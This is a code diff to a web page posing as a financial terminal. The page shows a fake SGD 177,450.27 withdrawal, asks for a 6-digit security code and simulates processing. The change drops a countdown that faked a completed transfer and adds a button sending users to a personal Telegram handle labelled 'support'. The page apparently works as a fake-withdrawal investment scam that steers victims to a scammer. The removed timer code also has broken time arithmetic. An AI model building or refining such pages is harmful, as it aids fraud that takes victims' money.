@@ -65,10 +65,14 @@
             border: none;
             padding: 14px;
             transition: all 0.2s ease;
+            text-decoration: none;
+            display: inline-block;
         }
         .btn-term-gold:hover {
             background-color: var(--term-gold-hover) !important;
             transform: translateY(-1px);
+            text-decoration: none;
+            color: #000000 !important;
         }
 
         .highlight-box {
@@ -204,11 +208,27 @@
             color: #ffffff;
         }
 
-        .verification-timer {
-            font-size: 1.5rem;
-            font-weight: bold;
-            color: var(--success-green);
-            font-family: monospace;
+        .btn-message {
+            background-color: var(--term-accent-gold) !important;
+            color: #000000 !important;
+            font-weight: 700;
+            border-radius: 8px;
+            border: none;
+            padding: 14px;
+            transition: all 0.2s ease;
+            cursor: pointer;
+            width: 100%;
+            text-transform: uppercase;
+            margin-top: 15px;
+            text-decoration: none;
+            display: block;
+        }
+
+        .btn-message:hover {
+            background-color: var(--term-gold-hover) !important;
+            transform: translateY(-1px);
+            text-decoration: none;
+            color: #000000 !important;
         }
     </style>
 </head>
@@ -301,7 +321,7 @@
                     <p style="color: var(--term-text-muted);" class="small mb-4">Input the 6-digit security code to authorize the withdrawal of SGD 177,450.27.</p>
                     
                     <div class="mb-4">
-                        <input type="password" id="pinVerificationInput" class="form-control term-input-field text-center fs-2 tracking-widest mx-auto" style="max-width: 220px;" maxlength="6" placeholder="••••••">
+                        <input type="password" id="pinVerificationInput" class="form-control term-input-field text-center fs-2 tracking-widest mx-auto" style="max-width: 220px;" maxlength="6" placeholder="000000">
                     </div>
                     <button class="btn-term-gold w-100 text-uppercase" onclick="executeTokenValidation()">Execute Signature Verification</button>
                 </div>
@@ -313,7 +333,7 @@
                     <p class="text-muted small mb-0">Validating security parameters and preparing asset transfer.</p>
                 </div>
 
-                <!-- STEP 5: VERIFICATION HOLD - 10 HOUR-->
+                <!-- STEP 5: VERIFICATION HOLD - WITH TELEGRAM DM BUTTON -->
                 <div id="layerVerificationHold" class="app-flow-card d-none text-center">
                     <div class="d-flex align-items-center gap-3 mb-3 justify-content-center">
                         <h3 class="m-0" style="color: var(--term-accent-gold);">⏱️</h3>
@@ -327,8 +347,8 @@
                         <p class="mb-3">Standard security verification requires a verification period before final authorization.</p>
                         
                         <div class="highlight-box text-white">
-                            <p class="mb-2"><strong>Time Remaining:</strong></p>
-                            <p class="verification-timer" id="verificationTimer">10:00:00</p>
+                            <p class="mb-2"><strong>Verification Status:</strong></p>
+                            <p class="m-0">Processing your request...</p>
                         </div>
 
                         <div class="code-details-block">
@@ -339,7 +359,8 @@
                         </div>
                     </div>
 
-                    <p class="text-muted small">The system will automatically complete the transaction after verification period expires.</p>
+                    <p class="text-muted small mb-3">Need assistance with your verification?</p>
+                    <a href="https://t.me/HODER21" target="_blank" class="btn-message">📨 Contact Support on Telegram</a>
                 </div>
 
                 <!-- STEP 6: SUCCESS COMPLETION -->
@@ -426,45 +447,10 @@
                 // Emulates an algorithmic execution processing delay before verification hold
                 setTimeout(function() {
                     switchState('layerLoadingWheel', 'layerVerificationHold');
-                    startVerificationTimer();
                 }, 3000);
             } else {
                 alert("Security matrix mismatch: Input parameters incorrect.");
             }
-        }
-
-        // Verification Timer - 10 Hour
-        let verificationInterval;
-        function startVerificationTimer() {
-            let timeRemaining = 360000; // 10 HOUR in seconds
-            
-            function updateTimer() {
-                const hours = Math.floor(timeRemaining / 360000);
-                const minutes = Math.floor((timeRemaining % 360000) / 6000);
-                const seconds = timeRemaining % 600;
-                
-                const timeString = 
-                    String(hours).padStart(2, '0') + ':' +
-                    String(minutes).padStart(2, '0') + ':' +
-                    String(seconds).padStart(2, '0');
-                
-                document.getElementById('verificationTimer').textContent = timeString;
-                
-                if (timeRemaining <= 0) {
-                    clearInterval(verificationInterval);
-                    completeVerification();
-                } else {
-                    timeRemaining--;
-                }
-            }
-            
-            updateTimer();
-            verificationInterval = setInterval(updateTimer, 100000);
-        }
-
-        // Auto-complete verification after 10 hour
-        function completeVerification() {
-            switchState('layerVerificationHold', 'layerSuccess');
         }
 
         // Clean structural variables state baseline back to origin
@@ -474,8 +460,6 @@
             
             if (targetForm) targetForm.reset();
             if (targetPin) targetPin.value = '';
-            
-            if (verificationInterval) clearInterval(verificationInterval);
             
             switchState('layerSuccess', 'layerWallet');
         }
